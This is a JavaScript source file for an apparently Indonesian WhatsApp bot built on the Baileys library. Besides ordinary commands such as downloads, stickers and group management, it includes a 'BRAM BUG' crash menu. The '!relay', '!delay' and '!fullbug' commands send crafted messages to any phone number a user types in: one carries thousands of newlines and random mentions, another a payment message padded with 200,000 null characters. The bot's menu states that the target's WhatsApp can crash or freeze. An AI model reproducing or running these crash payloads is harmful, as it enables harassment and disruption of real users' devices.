// ================================================================
// IMPORT BAILEYS — CARA SIMPLE
// ================================================================

import makeWASocket from '@whiskeysockets/baileys';
import * as Baileys from '@whiskeysockets/baileys';

const {
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestWaWebVersion,
    generateWAMessageFromContent,
    downloadMediaMessage,
} = Baileys;

import pino from 'pino';
import { Boom } from '@hapi/boom';
import qrcode from 'qrcode-terminal';
import fs from 'fs';
import crypto from 'crypto';
import chalk from 'chalk';
import axios from 'axios';
import dotenv from 'dotenv';
import readline from 'readline';

dotenv.config();

// ================================================================
// KONFIGURASI
// ================================================================
const config = {
    botName: process.env.BOT_NAME || 'BRAM IS HERE',
    prefix: process.env.PREFIX || '!',
    ownerNumber: process.env.OWNER_NUMBER || '6285379307765',
};

console.log(`
╔══════════════════════════════════════════════════════════════════╗
║          🤖 BRAM IS HERE — FULL BOT MD                      ║
╠══════════════════════════════════════════════════════════════════╣
║  Nama Bot   : ${config.botName}
║  Prefix     : ${config.prefix}
║  Owner      : ${config.ownerNumber}
╚══════════════════════════════════════════════════════════════════╝
`);

// ================================================================
// ERROR HANDLING
// ================================================================
process.on('uncaughtException', (error) => {
    console.log('⚠️ Uncaught Exception:', error.message);
});
process.on('unhandledRejection', (reason) => {
    console.log('⚠️ Unhandled Rejection:', reason);
});
process.on('SIGINT', () => {
    console.log('\n👋 Bot dimatikan!');
    process.exit(0);
});
process.on('SIGTERM', () => {
    console.log('\n👋 Bot di-terminate!');
    process.exit(0);
});

// ================================================================
// UTILITY FUNCTIONS
// ================================================================
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function formatNumber(number) {
    return number.replace(/\D/g, '');
}
function getTimestamp() {
    return new Date().toISOString().replace('T', ' ').slice(0, 19);
}

function askQuestion(query) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
    });
    return new Promise(resolve => rl.question(query, ans => {
        rl.close();
        resolve(ans);
    }));
}

// ================================================================
// DOWNLOAD FUNCTIONS
// ================================================================
async function downloadYouTube(url) {
    try {
        const response = await axios.get(`https://api.vevioz.com/api/button/yt-dl?url=${encodeURIComponent(url)}`);
        const data = response.data;
        if (data.success) {
            return {
                success: true,
                title: data.title,
                duration: data.duration,
                video: data.video.url,
                audio: data.audio.url,
                thumbnail: data.thumbnail,
            };
        }
        return { success: false, message: 'Gagal download YouTube' };
    } catch (error) {
        return { success: false, message: error.message };
    }
}

// ================================================================
// BRAM BUG FUNCTIONS
// ================================================================

// 1. RELAY SPAM
async function bramRelaySpam(sock, target) {
    try {
        const mentioned = [];
        for (let i = 0; i < 1900; i++) {
            mentioned.push(Math.floor(Math.random() * 5000000) + "@s.whatsapp.net");
        }
        await sock.relayMessage(
            target,
            {
                extendedTextMessage: {
                    text: "\n".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: ["1351515@s.whatsapp.net", ...mentioned],
                        remoteJid: target,
                        stanzaId: "1234567890ABCDEF",
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimestamp: Date.now() + 1814400000,
                            },
                        },
                    },
                },
            },
            { participant: { jid: target } }
        );
        return true;
    } catch (error) {
        return false;
    }
}

// 2. DELAY PAYMENT
async function delayPayment(sock, X) {
    try {
        const payload = {
            sendPaymentMessage: {
                noteMessage: {
                    extendedTextMessage: { text: "\u0000".repeat(200000) }
                },
                amount1000: 50000,
                currency: "IDR",
            }
        };
        const msg = generateWAMessageFromContent(X, payload, {});
        await sock.relayMessage(X, msg.message, { messageId: msg.key.id });
        return true;
    } catch (error) {
        return false;
    }
}

// 3. FULL BUG ATTACK
async function bramFullBugAttack(sock, target) {
    const results = {
        relaySpam: false,
        delayPayment: false,
    };
    console.log('🔥 Menjalankan Relay Spam...');
    results.relaySpam = await bramRelaySpam(sock, target);
    await sleep(1000);
    console.log('🔥 Menjalankan Delay Payment...');
    results.delayPayment = await delayPayment(sock, target);
    await sleep(1000);
    return results;
}

// ================================================================
// CONNECT TO WHATSAPP
// ================================================================
async function connectToWhatsApp() {
    try {
        // Hapus auth_info lama
        try {
            if (fs.existsSync('auth_info')) {
                fs.rmSync('auth_info', { recursive: true, force: true });
                console.log('🧹 Folder auth_info lama dihapus');
            }
        } catch (e) {}

        console.log('\n📱 *LOGIN WHATSAPP BOT*');
        console.log('='.repeat(40));
        console.log('Pilih metode login:');
        console.log('1. Scan QR Code (otomatis)');
        console.log('2. Pairing Code (masukkan nomor)');
        console.log('='.repeat(40));

        const choice = await askQuestion('Pilih metode (1/2): ');

        let phoneNumber = '';
        if (choice === '2') {
            phoneNumber = await askQuestion('📱 Masukkan nomor HP (contoh: 628123456789): ');
            phoneNumber = formatNumber(phoneNumber);
            if (!phoneNumber) {
                console.log('❌ Nomor tidak valid! Menggunakan QR Code...');
            }
        }

        if (!fs.existsSync('auth_info')) {
            fs.mkdirSync('auth_info');
            console.log('📁 Folder auth_info dibuat');
        }

        const { state, saveCreds } = await useMultiFileAuthState('auth_info');
        const { version } = await fetchLatestWaWebVersion();

        console.log(`📱 WhatsApp Version: ${version.join('.')}`);

        const sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: true,
            auth: state,
            browser: ['BRAM IS HERE', 'Chrome', '20.0.0'],
            markOnlineOnConnect: true,
        });

        sock.ev.on('creds.update', saveCreds);

        if (choice === '2' && phoneNumber) {
            console.log(`\n⏳ Meminta pairing code untuk ${phoneNumber}...`);
            try {
                const code = await sock.requestPairingCode(phoneNumber);
                console.log(`\n🔑 *PAIRING CODE: ${code}*`);
                console.log('📱 Buka WhatsApp → Settings → Linked Devices → Link with Phone Number');
                console.log(`📱 Masukkan kode: ${code}\n`);
                fs.writeFileSync('pairing_code.txt', `Kode: ${code}\nNomor: ${phoneNumber}\nTanggal: ${new Date().toISOString()}`);
            } catch (err) {
                console.log('❌ Error pairing:', err.message);
            }
        }

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;

            if (qr) {
                console.log('\n📱 *SCAN QR CODE:*');
                qrcode.generate(qr, { small: true });
                console.log('\n📱 Buka WhatsApp → Settings → Linked Devices → Link a Device\n');
            }

            if (connection === 'close') {
                const shouldReconnect = (lastDisconnect?.error instanceof Boom) &&
                    lastDisconnect.error.output?.statusCode !== DisconnectReason.loggedOut;
                if (shouldReconnect) {
                    console.log('⏳ Reconnecting...');
                    setTimeout(connectToWhatsApp, 5000);
                } else {
                    console.log('👋 Logout, hapus folder auth_info untuk login ulang');
                }
            }

            if (connection === 'open') {
                console.log('\n✅ BRAM IS HERE AKTIF!');
                console.log(`📌 Prefix: ${config.prefix}\n`);
                try {
                    await sock.sendMessage(config.ownerNumber + '@s.whatsapp.net', {
                        text: `🤖 *BRAM IS HERE AKTIF!*\n📌 Prefix: ${config.prefix}\n\n💀 Ketik ${config.prefix}brambug untuk menu crash!`
                    });
                } catch (e) {
                    console.log('⚠️ Tidak bisa kirim pesan ke owner');
                }
            }
        });

        sock.ev.on('messages.upsert', async ({ messages }) => {
            const msg = messages[0];
            if (!msg.message || msg.key.fromMe) return;

            const remoteJid = msg.key.remoteJid;
            const isGroup = remoteJid?.includes('@g.us');
            let text = msg.message.conversation ||
                msg.message.extendedTextMessage?.text ||
                msg.message.imageMessage?.caption ||
                msg.message.videoMessage?.caption || '';

            if (!text) return;
            if (!text.startsWith(config.prefix)) return;

            const args = text.slice(config.prefix.length).trim().split(/\s+/);
            const command = args.shift().toLowerCase();

            console.log(`📨 ${isGroup ? 'Group' : 'Private'}: ${command}`);

            try {
                await handleCommand(sock, msg, command, args, remoteJid, isGroup);
            } catch (error) {
                console.error('Error:', error);
                await sock.sendMessage(remoteJid, { text: `❌ Error: ${error.message}` });
            }
        });

        return sock;

    } catch (error) {
        console.log('❌ Connection Error:', error.message);
        console.log('⏳ Reconnecting in 5 seconds...');
        setTimeout(connectToWhatsApp, 5000);
    }
}

// ================================================================
// COMMAND HANDLER
// ================================================================
async function handleCommand(sock, msg, command, args, remoteJid, isGroup) {
    const sender = msg.key.participant || msg.key.remoteJid;

    // MENU UTAMA
    if (command === 'menu' || command === 'help') {
        const menu = `
╔══════════════════════════════════════════════════════════════════╗
║          🤖 BRAM IS HERE — MENU LENGKAP                       ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  🔥 *MENU UTAMA*                                                ║
║  !ping       → Cek status bot                                  ║
║  !menu       → Tampilkan menu ini                              ║
║  !info       → Info bot & owner                               ║
║                                                                   ║
║  💀 *BRAM BUG MENU*                                             ║
║  !brambug    → Menu Crash WhatsApp                             ║
║  !bbug       → Shortcut menu crash                             ║
║                                                                   ║
║  📥 *DOWNLOAD MENU*                                            ║
║  !yt <url>   → Download YouTube                                ║
║                                                                   ║
║  🛠️ *GROUP MENU*                                              ║
║  !tag <text> → Hidetag grup                                   ║
║  !sticker    → Buat sticker                                   ║
║  !say <text> → Bot ngomong                                   ║
║                                                                   ║
║  👑 *OWNER MENU*                                               ║
║  !invite <nomor> → Tambah anggota                             ║
║  !add <nomor>   → Tambah anggota (alias)                      ║
║  !kick @tag     → Keluarkan anggota                           ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
        `;
        await sock.sendMessage(remoteJid, { text: menu });
        return;
    }

    // BRAM BUG MENU
    if (command === 'brambug' || command === 'bbug') {
        const menu = `
╔══════════════════════════════════════════════════════════════════╗
║          💀 BRAM BUG — FULL CRASH MENU                       ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  🔥 *CRASH MENU*                                                ║
║  !relay <target>  → Relay Spam (9000+ mention)                  ║
║  !delay <target>  → Delay Payment Bug                           ║
║  !fullbug <target> → ALL BUGS (Full Attack)                    ║
║                                                                   ║
║  📱 *CARA PAKAI:*                                               ║
║  !relay 628123456789                                            ║
║  !fullbug 628123456789                                          ║
║                                                                   ║
║  ⚠️ *Efek:* WhatsApp target bisa crash/freeze                  ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
        `;
        await sock.sendMessage(remoteJid, { text: menu });
        return;
    }

    // RELAY SPAM
    if (command === 'relay') {
        const target = args[0];
        if (!target) {
            await sock.sendMessage(remoteJid, { text: `❌ Gunakan: !relay <nomor>` });
            return;
        }
        const cleanTarget = target.replace(/\D/g, '') + '@s.whatsapp.net';
        await sock.sendMessage(remoteJid, { text: `💀 Memulai Relay Spam ke ${target}...` });
        const result = await bramRelaySpam(sock, cleanTarget);
        await sock.sendMessage(remoteJid, {
            text: result ? `✅ Relay Spam selesai ke ${target}` : `❌ Relay Spam gagal ke ${target}`
        });
        return;
    }

    // DELAY PAYMENT
    if (command === 'delay') {
        const target = args[0];
        if (!target) {
            await sock.sendMessage(remoteJid, { text: `❌ Gunakan: !delay <nomor>` });
            return;
        }
        const cleanTarget = target.replace(/\D/g, '') + '@s.whatsapp.net';
        await sock.sendMessage(remoteJid, { text: `💀 Memulai Delay Payment ke ${target}...` });
        const result = await delayPayment(sock, cleanTarget);
        await sock.sendMessage(remoteJid, {
            text: result ? `✅ Delay Payment selesai ke ${target}` : `❌ Delay Payment gagal ke ${target}`
        });
        return;
    }

    // FULL BUG ATTACK
    if (command === 'fullbug') {
        const target = args[0];
        if (!target) {
            await sock.sendMessage(remoteJid, { text: `❌ Gunakan: !fullbug <nomor>` });
            return;
        }
        const cleanTarget = target.replace(/\D/g, '') + '@s.whatsapp.net';
        await sock.sendMessage(remoteJid, {
            text: `💀 *FULL BUG ATTACK ke ${target}*\n🔥 Semua Bug Akan Dikirim\n⏳ Mohon tunggu...`
        });
        const results = await bramFullBugAttack(sock, cleanTarget);
        let resultText = `✅ *FULL BUG ATTACK SELESAI!*\n📱 Target: ${target}\n\n📊 *Hasil:*\n`;
        resultText += `✅ Relay Spam: ${results.relaySpam ? 'Berhasil' : 'Gagal'}\n`;
        resultText += `✅ Delay Payment: ${results.delayPayment ? 'Berhasil' : 'Gagal'}\n`;
        await sock.sendMessage(remoteJid, { text: resultText });
        return;
    }

    // YOUTUBE DOWNLOAD
    if (command === 'yt' || command === 'youtube') {
        const url = args[0];
        if (!url) {
            await sock.sendMessage(remoteJid, {
                text: `❌ Gunakan: !yt <url YouTube>`
            });
            return;
        }
        await sock.sendMessage(remoteJid, { text: '⏳ Mengunduh video YouTube...' });
        const result = await downloadYouTube(url);
        if (result.success) {
            await sock.sendMessage(remoteJid, {
                video: { url: result.video },
                caption: `📥 *YouTube Download*\n📌 Judul: ${result.title}\n⏱️ Durasi: ${result.duration}`
            });
        } else {
            await sock.sendMessage(remoteJid, { text: `❌ ${result.message}` });
        }
        return;
    }

    // PING
    if (command === 'ping') {
        await sock.sendMessage(remoteJid, {
            text: `🏓 Pong! BRAM IS HERE aktif!`
        });
        return;
    }

    // INFO
    if (command === 'info') {
        await sock.sendMessage(remoteJid, {
            text: `🤖 *BRAM IS HERE*\n📌 Prefix: ${config.prefix}\n👤 Owner: ${config.ownerNumber}\n⚡ Status: Online\n💀 Fitur Crash: Aktif\n📥 Fitur Download: Aktif`
        });
        return;
    }

    // SAY
    if (command === 'say') {
        if (args.length === 0) {
            await sock.sendMessage(remoteJid, {
                text: `❌ Gunakan: !say <teks>`
            });
            return;
        }
        await sock.sendMessage(remoteJid, { text: args.join(' ') });
        return;
    }

    // TAG (HIDETAG)
    if (command === 'tag') {
        if (!isGroup) {
            await sock.sendMessage(remoteJid, { text: '❌ Perintah ini hanya untuk grup!' });
            return;
        }
        const text = args.join(' ') || '📢 Hidetag!';
        const groupMetadata = await sock.groupMetadata(remoteJid);
        const participants = groupMetadata.participants.map(p => p.id);
        const messageText = `${text}\n\n${participants.map(m => `@${m.split('@')[0]}`).join(' ')}`;
        await sock.sendMessage(remoteJid, {
            text: messageText,
            mentions: participants
        });
        return;
    }

    // STICKER
    if (command === 'sticker' || command === 'stiker') {
        const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
        let mediaMessage = null;
        if (quoted?.imageMessage) mediaMessage = quoted.imageMessage;
        else if (quoted?.videoMessage) mediaMessage = quoted.videoMessage;
        else if (msg.message.imageMessage) mediaMessage = msg.message.imageMessage;
        else if (msg.message.videoMessage) mediaMessage = msg.message.videoMessage;
        if (!mediaMessage) {
            await sock.sendMessage(remoteJid, {
                text: `❌ Kirim gambar/video dengan caption !sticker`
            });
            return;
        }
        await sock.sendMessage(remoteJid, { text: '⏳ Membuat sticker...' });
        try {
            const media = await downloadMediaMessage(msg);
            if (!media) {
                await sock.sendMessage(remoteJid, { text: '❌ Gagal download media' });
                return;
            }
            await sock.sendMessage(remoteJid, {
                sticker: media,
                mimetype: 'image/webp',
            });
        } catch (error) {
            await sock.sendMessage(remoteJid, { text: `❌ Error: ${error.message}` });
        }
        return;
    }

    // INVITE / ADD (OWNER ONLY)
    if (command === 'invite' || command === 'add') {
        const ownerNumber = config.ownerNumber + '@s.whatsapp.net';
        if (sender !== ownerNumber) {
            await sock.sendMessage(remoteJid, { text: '❌ Perintah ini hanya untuk owner!' });
            return;
        }
        if (!isGroup) {
            await sock.sendMessage(remoteJid, { text: '❌ Perintah ini hanya untuk grup!' });
            return;
        }
        const number = args[0];
        if (!number) {
            await sock.sendMessage(remoteJid, {
                text: `❌ Gunakan: ${config.prefix}invite 628123456789`
            });
            return;
        }
        const cleanNumber = number.replace(/\D/g, '');
        const jid = cleanNumber + '@s.whatsapp.net';
        try {
            await sock.groupParticipantsUpdate(remoteJid, [jid], 'add');
            await sock.sendMessage(remoteJid, {
                text: `✅ @${cleanNumber} berhasil ditambahkan ke grup!`,
                mentions: [jid]
            });
        } catch (error) {
            await sock.sendMessage(remoteJid, {
                text: `❌ Gagal menambahkan: ${error.message}`
            });
        }
        return;
    }

    // KICK (OWNER ONLY)
    if (command === 'kick') {
        const ownerNumber = config.ownerNumber + '@s.whatsapp.net';
        if (sender !== ownerNumber) {
            await sock.sendMessage(remoteJid, { text: '❌ Perintah ini hanya untuk owner!' });
            return;
        }
        if (!isGroup) {
            await sock.sendMessage(remoteJid, { text: '❌ Perintah ini hanya untuk grup!' });
            return;
        }
        const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
        if (mentioned.length === 0) {
            await sock.sendMessage(remoteJid, { text: `❌ Tag anggota yang ingin di-kick!` });
            return;
        }
        for (const user of mentioned) {
            try {
                await sock.groupParticipantsUpdate(remoteJid, [user], 'remove');
                await sock.sendMessage(remoteJid, {
                    text: `✅ @${user.split('@')[0]} berhasil dikeluarkan!`,
                    mentions: [user]
                });
            } catch (error) {
                await sock.sendMessage(remoteJid, {
                    text: `❌ Gagal mengeluarkan: ${error.message}`
                });
            }
        }
        return;
    }

    // UNKNOWN
    await sock.sendMessage(remoteJid, {
        text: `❌ Perintah tidak dikenal.\nKetik !menu atau !brambug untuk melihat perintah.`
    });
}

// ================================================================
// START BOT
// ================================================================
console.log('🚀 Bot siap dijalankan...\n');
connectToWhatsApp().catch(console.error);
